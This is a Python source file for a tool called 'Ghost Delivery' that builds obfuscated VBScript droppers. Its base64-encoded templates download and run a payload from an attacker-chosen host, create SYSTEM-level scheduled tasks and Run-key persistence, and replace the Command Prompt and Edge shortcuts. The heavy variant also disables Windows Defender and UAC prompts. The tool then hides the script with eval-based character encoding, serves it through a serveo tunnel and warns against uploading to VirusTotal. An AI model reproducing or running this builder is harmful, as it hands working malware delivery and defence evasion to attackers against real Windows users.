import random, sys, string, os, time, base64

def gen_gd():
		print("""
		~G h o s t  D e l i v e r y~

This tool is designed create a obfuscated .vbs script with two options:
	
	Heavy:
	*Downloads payload to TEMP directory and executes payload
	*Disables Defender
	*Disables UAC
	*Injects/creates Command Prompt and Microsoft Edge
	shortcuts with payload path
	*Adds scheduled task for payload to be run at login
	*Obfuscates the vbs script

	Light:
	*Downloads payload to TEMP directory and executes payload
	*Adds scheduled task for payload to be run at login
	*Injects/creates Command Prompt and Microsoft Edge
	shortcuts with payload path
	*Obfuscates the vbs script

This tool also has a serveo function to deliver obfuscated vbs script
				""")

def clear():
	if os.name == "nt": 
		os.system('cls')
	else: 
		os.system('clear')


class build():

	def vbs(self):
	
		heavy = {'heavy','h'}
		light = {'light','l'}
		pwsh = {'powershell','ps1','.ps1', 'pwsh', 'p'}
		exe = {'executable','exe','.exe', 'e'}

		def executable():
			clear()
			input = raw_input("\nDo you want a light or heavy script? Enter heavy/light: ").lower()
			if input in heavy:
				script = "J0lmIFdTY3JpcHQuQXJndW1lbnRzLmxlbmd0aCA9IDAgVGhlbicsICcgICBTZXQgb2JqU2hlbGwgPSBDcmVhdGVPYmplY3QoIlNoZWxsLkFwcGxpY2F0aW9uIiknLCAnICAgIG9ialNoZWxsLlNoZWxsRXhlY3V0ZSAid3NjcmlwdC5leGUiLCBDaHIoMzQpICYgXycsICcgICAgICBXU2NyaXB0LlNjcmlwdEZ1bGxOYW1lICYgQ2hyKDM0KSAmICIgdWFjIiwgIiIsICJydW5hcyIsIDEnLCAnRWxzZScsICdTZXQgd3NjID0gQ3JlYXRlT2JqZWN0KCJXc2NyaXB0LnNoZWxsIiknLCAnd3NjLmV4ZWMoInBvd2Vyc2hlbGwgLXdpbmRvd3N0eWxlIGhpZGRlbiAtY29tbWFuZCAmIHsgaXdyIGh0dHA6Ly9hZGRyZXNzL3BheWxvYWQuZXhlIC1PdXRGaWxlICVURU1QJS9wYXlsb2FkLmV4ZSB9OyAlVEVNUCUvLi9wYXlsb2FkLmV4ZTsgU2NodGFza3MgL0NyZWF0ZSAvdG4gV2luZG93c0RlZmVuZGVyIC9zYyBPTkxPR09OIC9ybCBoaWdoZXN0IC9ydSBzeXN0ZW0gL0YgL3RyICIiJVRFTVAlL3BheWxvYWQuZXhlIiIiKScsICd3c2MuUmVnV3JpdGUgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXIgU2VjdXJpdHkgQ2VudGVyXE5vdGlmaWNhdGlvbnNcRGlzYWJsZUVuaGFuY2VkTm90aWZpY2F0aW9ucyIsIDEsICJSRUdfRFdPUkQiJywgJ3dzYy5SZWdXcml0ZSAiSEtMTVxTb2Z0d2FyZVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxVWCBDb25maWd1cmF0aW9uXE5vdGlmaWNhdGlvbl9TdXBwcmVzcyIsIDEsICJSRUdfRFdPUkQiJywgJ3dzYy5SZWdXcml0ZSAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW1cQ29uc2VudFByb21wdEJlaGF2aW9yVXNlciIsIDAsICJSRUdfRFdPUkQiJywgJ3dzYy5SZWdXcml0ZSAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW1cQ29uc2VudFByb21wdEJlaGF2aW9yQWRtaW4iLCAwLCAiUkVHX0RXT1JEIicsICd3c2MuUmVnV3JpdGUgIkhLTE1cU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXFdpbmRvd3MgRGVmZW5kZXIiLCAiVEVNUC9wYXlsb2FkLmV4ZSIsICJSRUdfU1oiJywgJ3dzYy5SZWdXcml0ZSAiSEtMTVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5cV2luZG93cyBTZWN1cml0eSIsICIlVEVNUCUvcGF5bG9hZC5leGUiLCAiUkVHX1NaIicsICd3c2MuUmVnV3JpdGUgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRGlzYWJsZUFudGlTcHl3YXJlIiwgMSwgIlJFR19EV09SRCInLCAnU2V0IGxuayA9IHdzYy5DcmVhdGVTaG9ydGN1dCh3c2MuU3BlY2lhbEZvbGRlcnMoImRlc2t0b3AiKSAmICJcY21kLkxOSyIpJywgJ2xuay50YXJnZXRwYXRoID0gIkM6XFdpbmRvd3NcU3lzdGVtMzJcY21kLmV4ZSInLCAnbG5rLkFyZ3VtZW50cyA9ICIvYyBTVEFSVCAvTUlOIHBvd2Vyc2hlbGwgLXdpbmRvd3N0eWxlIGhpZGRlbiAtQ29tbWFuZCBTdGFydC1Qcm9jZXNzIGNtZDsgJVRFTVAlLy4vcGF5bG9hZC5leGUiJywgJ2xuay5zYXZlJywgJ1NldCBsbmsgPSB3c2MuQ3JlYXRlU2hvcnRjdXQod3NjLlNwZWNpYWxGb2xkZXJzKCJkZXNrdG9wIikgJiAiXE1pY3Jvc29mdCBFZGdlLkxOSyIpJywgJ2xuay50YXJnZXRwYXRoID0gIkM6XFdpbmRvd3NcU3lzdGVtMzJcY21kLmV4ZSInLCAnbG5rLkFyZ3VtZW50cyA9ICIvYyBTVEFSVCAvTUlOIHBvd2Vyc2hlbGwuZXhlIC13aW5kb3dzdHlsZSBoaWRkZW4gLWNvbW1hbmQgc3RhcnQgbWljcm9zb2Z0LWVkZ2U6OyAlVEVNUCUvLi9wYXlsb2FkLmV4ZTsiJywgJ2xuay5zYXZlJywgJ0VuZCBpZicK"
			elif input in light:
				script = "J0lmIFdTY3JpcHQuQXJndW1lbnRzLmxlbmd0aCA9IDAgVGhlbicsICcgICBTZXQgb2JqU2hlbGwgPSBDcmVhdGVPYmplY3QoIlNoZWxsLkFwcGxpY2F0aW9uIiknLCAnICAgIG9ialNoZWxsLlNoZWxsRXhlY3V0ZSAid3NjcmlwdC5leGUiLCBDaHIoMzQpICYgXycsICcgICAgICBXU2NyaXB0LlNjcmlwdEZ1bGxOYW1lICYgQ2hyKDM0KSAmICIgdWFjIiwgIiIsICJydW5hcyIsIDEnLCAnRWxzZScsICdTZXQgd3NjID0gQ3JlYXRlT2JqZWN0KCJXc2NyaXB0LnNoZWxsIiknLCAnd3NjLmV4ZWMoInBvd2Vyc2hlbGwgLXdpbmRvd3N0eWxlIGhpZGRlbiAtY29tbWFuZCAmIHsgaXdyIGh0dHA6Ly9hZGRyZXNzL3BheWxvYWQuZXhlIC1PdXRGaWxlICVURU1QJS9wYXlsb2FkLmV4ZSB9OyAlVEVNUCUvLi9wYXlsb2FkLmV4ZTsgU2NodGFza3MgL0NyZWF0ZSAvdG4gV2luZG93c0RlZmVuZGVyIC9zYyBPTkxPR09OIC9ybCBoaWdoZXN0IC9ydSBzeXN0ZW0gL0YgL3RyICIiJVRFTVAlL3BheWxvYWQuZXhlIiIiKScsICdTZXQgbG5rID0gd3NjLkNyZWF0ZVNob3J0Y3V0KHdzYy5TcGVjaWFsRm9sZGVycygiZGVza3RvcCIpICYgIlxjbWQuTE5LIiknLCAnbG5rLnRhcmdldHBhdGggPSAiQzpcV2luZG93c1xTeXN0ZW0zMlxjbWQuZXhlIicsICdsbmsuQXJndW1lbnRzID0gIi9jIFNUQVJUIC9NSU4gcG93ZXJzaGVsbCAtd2luZG93c3R5bGUgaGlkZGVuIC1Db21tYW5kIFN0YXJ0LVByb2Nlc3MgY21kOyAlVEVNUCUvLi9wYXlsb2FkLmV4ZSInLCAnbG5rLnNhdmUnLCAnU2V0IGxuayA9IHdzYy5DcmVhdGVTaG9ydGN1dCh3c2MuU3BlY2lhbEZvbGRlcnMoImRlc2t0b3AiKSAmICJcTWljcm9zb2Z0IEVkZ2UuTE5LIiknLCAnbG5rLnRhcmdldHBhdGggPSAiQzpcV2luZG93c1xTeXN0ZW0zMlxjbWQuZXhlIicsICdsbmsuQXJndW1lbnRzID0gIi9jIFNUQVJUIC9NSU4gcG93ZXJzaGVsbC5leGUgLXdpbmRvd3N0eWxlIGhpZGRlbiAtY29tbWFuZCBzdGFydCBtaWNyb3NvZnQtZWRnZTo7ICVURU1QJS8uL3BheWxvYWQuZXhlOyInLCAnbG5rLnNhdmUnLCAnRW5kIGlmJw=="
			else:
				executable()
			x.replace(script)


		def powershell():
			clear()
			input = raw_input("\nDo you want a light or heavy script? Enter heavy/light: ").lower()
			if input in heavy:
				script = "J0lmIFdTY3JpcHQuQXJndW1lbnRzLmxlbmd0aCA9IDAgVGhlbicsICcgICBTZXQgb2JqU2hlbGwgPSBDcmVhdGVPYmplY3QoIlNoZWxsLkFwcGxpY2F0aW9uIiknLCAnICAgIG9ialNoZWxsLlNoZWxsRXhlY3V0ZSAid3NjcmlwdC5leGUiLCBDaHIoMzQpICYgXycsICcgICAgICBXU2NyaXB0LlNjcmlwdEZ1bGxOYW1lICYgQ2hyKDM0KSAmICIgdWFjIiwgIiIsICJydW5hcyIsIDEnLCAnRWxzZScsICdTZXQgd3NjID0gQ3JlYXRlT2JqZWN0KCJXc2NyaXB0LnNoZWxsIiknLCAnd3NjLmV4ZWMoInBvd2Vyc2hlbGwgLXdpbmRvd3N0eWxlIGhpZGRlbiB3Z2V0IGh0dHBzOi8vYWRkcmVzcy9wYXlsb2FkLnBzMSAtT3V0RmlsZSAlVEVNUCUvcGF5bG9hZC5wczE7IHBvd2Vyc2hlbGwgLWV4ZWN1dGlvbnBvbGljeSBieXBhc3MgLUZpbGUgJVRFTVAlLy4vcGF5bG9hZC5wczE7IFNjaHRhc2tzIC9DcmVhdGUgL3RuIFdpbmRvd3NEZWZlbmRlciAvc2MgT05MT0dPTiAvcmwgaGlnaGVzdCAvcnUgc3lzdGVtIC9GIC90ciAiIiVURU1QJS9wYXlsb2FkLnBzMSIiIiknLCAnd3NjLlJlZ1dyaXRlICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyIFNlY3VyaXR5IENlbnRlclxOb3RpZmljYXRpb25zXERpc2FibGVFbmhhbmNlZE5vdGlmaWNhdGlvbnMiLCAxLCAiUkVHX0RXT1JEIicsICd3c2MuUmVnV3JpdGUgIkhLTE1cU29mdHdhcmVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcVVggQ29uZmlndXJhdGlvblxOb3RpZmljYXRpb25fU3VwcHJlc3MiLCAxLCAiUkVHX0RXT1JEIicsICd3c2MuUmVnV3JpdGUgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtXENvbnNlbnRQcm9tcHRCZWhhdmlvclVzZXIiLCAwLCAiUkVHX0RXT1JEIicsICd3c2MuUmVnV3JpdGUgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtXENvbnNlbnRQcm9tcHRCZWhhdmlvckFkbWluIiwgMCwgIlJFR19EV09SRCInLCAnd3NjLlJlZ1dyaXRlICJIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1blxXaW5kb3dzIERlZmVuZGVyIiwgIlRFTVAvcGF5bG9hZC5leGUiLCAiUkVHX1NaIicsICd3c2MuUmVnV3JpdGUgIkhLTE1cU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXFdpbmRvd3MgU2VjdXJpdHkiLCAiJVRFTVAlL3BheWxvYWQuZXhlIiwgIlJFR19TWiInLCAnd3NjLlJlZ1dyaXRlICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXERpc2FibGVBbnRpU3B5d2FyZSIsIDEsICJSRUdfRFdPUkQiJywgJ1NldCBsbmsgPSB3c2MuQ3JlYXRlU2hvcnRjdXQod3NjLlNwZWNpYWxGb2xkZXJzKCJkZXNrdG9wIikgJiAiXGNtZC5MTksiKScsICdsbmsudGFyZ2V0cGF0aCA9ICJDOlxXaW5kb3dzXFN5c3RlbTMyXGNtZC5leGUiJywgJ2xuay5Bcmd1bWVudHMgPSAiL2MgU1RBUlQgL01JTiBwb3dlcnNoZWxsIC13aW5kb3dzdHlsZSBoaWRkZW4gLUNvbW1hbmQgU3RhcnQtUHJvY2VzcyBjbWQ7ICVURU1QJS8uL3BheWxvYWQuZXhlIicsICdsbmsuc2F2ZScsICdTZXQgbG5rID0gd3NjLkNyZWF0ZVNob3J0Y3V0KHdzYy5TcGVjaWFsRm9sZGVycygiZGVza3RvcCIpICYgIlxNaWNyb3NvZnQgRWRnZS5MTksiKScsICdsbmsudGFyZ2V0cGF0aCA9ICJDOlxXaW5kb3dzXFN5c3RlbTMyXGNtZC5leGUiJywgJ2xuay5Bcmd1bWVudHMgPSAiL2MgU1RBUlQgL01JTiBwb3dlcnNoZWxsLmV4ZSAtd2luZG93c3R5bGUgaGlkZGVuIC1jb21tYW5kIHN0YXJ0IG1pY3Jvc29mdC1lZGdlOjsgJVRFTVAlLy4vcGF5bG9hZC5leGU7IicsICdsbmsuc2F2ZScsICdFbmQgaWYn"
			elif input in light:
				script = "J0lmIFdTY3JpcHQuQXJndW1lbnRzLmxlbmd0aCA9IDAgVGhlbicsICcgICBTZXQgb2JqU2hlbGwgPSBDcmVhdGVPYmplY3QoIlNoZWxsLkFwcGxpY2F0aW9uIiknLCAnICAgIG9ialNoZWxsLlNoZWxsRXhlY3V0ZSAid3NjcmlwdC5leGUiLCBDaHIoMzQpICYgXycsICcgICAgICBXU2NyaXB0LlNjcmlwdEZ1bGxOYW1lICYgQ2hyKDM0KSAmICIgdWFjIiwgIiIsICJydW5hcyIsIDEnLCAnRWxzZScsICdTZXQgd3NjID0gQ3JlYXRlT2JqZWN0KCJXc2NyaXB0LnNoZWxsIiknLCAnd3NjLmV4ZWMoInBvd2Vyc2hlbGwgLXdpbmRvd3N0eWxlIGhpZGRlbiB3Z2V0IGh0dHBzOi8vYWRkcmVzcy9wYXlsb2FkLnBzMSAtT3V0RmlsZSAlVEVNUCUvcGF5bG9hZC5wczE7IHBvd2Vyc2hlbGwgLWV4ZWN1dGlvbnBvbGljeSBieXBhc3MgLUZpbGUgJVRFTVAlLy4vcGF5bG9hZC5wczE7IFNjaHRhc2tzIC9DcmVhdGUgL3RuIFdpbmRvd3NEZWZlbmRlciAvc2MgT05MT0dPTiAvcmwgaGlnaGVzdCAvcnUgc3lzdGVtIC9GIC90ciAiIiVURU1QJS9wYXlsb2FkLnBzMSIiIiknLCAnU2V0IGxuayA9IHdzYy5DcmVhdGVTaG9ydGN1dCh3c2MuU3BlY2lhbEZvbGRlcnMoImRlc2t0b3AiKSAmICJcY21kLkxOSyIpJywgJ2xuay50YXJnZXRwYXRoID0gIkM6XFdpbmRvd3NcU3lzdGVtMzJcY21kLmV4ZSInLCAnbG5rLkFyZ3VtZW50cyA9ICIvYyBTVEFSVCAvTUlOIHBvd2Vyc2hlbGwgLXdpbmRvd3N0eWxlIGhpZGRlbiAtQ29tbWFuZCBTdGFydC1Qcm9jZXNzIGNtZDsgJVRFTVAlLy4vcGF5bG9hZC5leGUiJywgJ2xuay5zYXZlJywgJ1NldCBsbmsgPSB3c2MuQ3JlYXRlU2hvcnRjdXQod3NjLlNwZWNpYWxGb2xkZXJzKCJkZXNrdG9wIikgJiAiXE1pY3Jvc29mdCBFZGdlLkxOSyIpJywgJ2xuay50YXJnZXRwYXRoID0gIkM6XFdpbmRvd3NcU3lzdGVtMzJcY21kLmV4ZSInLCAnbG5rLkFyZ3VtZW50cyA9ICIvYyBTVEFSVCAvTUlOIHBvd2Vyc2hlbGwuZXhlIC13aW5kb3dzdHlsZSBoaWRkZW4gLWNvbW1hbmQgc3RhcnQgbWljcm9zb2Z0LWVkZ2U6OyAlVEVNUCUvLi9wYXlsb2FkLmV4ZTsiJywgJ2xuay5zYXZlJywgJ0VuZCBpZic="
			else:
				powershell()
			x.replace(script)

		input = raw_input("Is your payload a powershell script or executable? enter 'ps1' or 'exe': ").lower()
		if input in pwsh:
			powershell()

		elif input in exe:
			executable()

		else:
			print("Enter ps1/exe")
			time.sleep(2)
			main()


	def replace(self, script):

		lstring = base64.b64decode(script)
		lines = lstring[1:-1].split("', '")
		ip = raw_input("\nEnter server IP address hosting your payload (Example: facebook.serveo.net): ")
		lines = [content.replace('address', ip) for content in lines]

		payload = raw_input("\nEnter name of payload to be delivered (Example: payload.exe): ")
		lines = [content.replace('payload.exe', payload) for content in lines]

		outfile = open("t", "w")
		with open("t", "w") as file:
			for line in lines:
				file.write(line + "\n")
			file.close()


	def obfs(self):
		splitter = str(chr(42))

		def randCapitalization(characters):
			capicharacter = ""
			for character in characters:
				lowup = random.randrange(0,2)
				if lowup == 0:
					capicharacter += character.upper()
				if lowup == 1:
					capicharacter +=  character.lower()
			return capicharacter

		NUM_OF_CHARS = random.randrange(5, 60)
		pld = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(NUM_OF_CHARS))
		array = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(NUM_OF_CHARS))
		temp = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(NUM_OF_CHARS))
		x = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(NUM_OF_CHARS))

		subOne = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(NUM_OF_CHARS))
		subTwo = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(NUM_OF_CHARS))

		def obfu(body):
			encBody = ""
			for i in range(0, len(body)):
				if encBody == "":
					encBody += expr(ord(body[i]))
				else:
					encBody += "*" + expr(ord(body[i]))
			return encBody

		def expr(char):
			range = random.randrange(100, 10001)
			exp = random.randrange(0, 3)

			if exp == 0:
				print "Char " + str(char) + " -> " + str((range+char)) + "-" + str(range)
				return str((range+char)) + "-" + str(range)
			if exp == 1:
				print "Char " + str(char) + " -> " + str((char-range)) + "+" + str(range)
				return str((char-range)) + "+" + str(range)
			if exp == 2:
				print "Char " + str(char) + " -> " + str((char*range)) + "/" + str(range)
				return str((char*range)) + "/" + str(range)

		clrtxt = open("t", "r")
		obfs = open("obfs.vbs", "w")
		obfs.write(randCapitalization("Dim " + pld + ", " + array + ", " + temp) + "\n")
		obfs.write(randCapitalization("Sub " + subOne) + "\n")
		obfs.write(randCapitalization(pld + " = ") + chr(34) + obfu(clrtxt.read()) + chr(34) + "\n")
		obfs.write(randCapitalization(array + " = Split(" + pld + ", chr(eval(") + obfu(splitter) + ")))\n")
		obfs.write(randCapitalization("for each " + x + " in " + array) + "\n")
		obfs.write(randCapitalization(temp + " = " + temp + " & chr(eval(" + x) + "))\n")
		obfs.write(randCapitalization("next") + "\n")
		obfs.write(randCapitalization(subTwo) + "\n")
		obfs.write(randCapitalization("End Sub") + "\n")
		obfs.write(randCapitalization("Sub " + subTwo) + "\n")
		obfs.write(randCapitalization("eval(execute(" + temp) + "))\n")
		obfs.write(randCapitalization("End Sub") + "\n")
		obfs.write(randCapitalization(subOne) + "\n")
		clrtxt.close()
		obfs.close()
		os.remove('t')

	def serveo(self):
		clear()
		yes = {'yes','y','ye',''}
		no = {'no','n','exit'}
		input = raw_input('Delivery script obfuscated and saved as "obfs.vbs"\n\nWould you like to start a serveo server to forward port 80 for payload delivery? yes/no: ').lower()

		if input in yes:
			domain = raw_input('\nenter subdomain name for serveo server: ')
			print("\n\nDon't upload to virus total!!!"* 15)
			time.sleep(2)
			os.system('ssh -o ServerAliveInterval=60 -R'+domain+'.serveo.net:80:localhost:80 serveo.net')

		elif input in no:
			print("\n\nDon't upload to virus total!!!"* 15)
			time.sleep(2)
			sys.exit()
		else:
			print("Choose yes or no")
			x.serveo()


def main():

	global x; x = build()
	clear()
	gen_gd()
	x.vbs()
	x.obfs()
	x.serveo()
if __name__== "__main__":
    main()
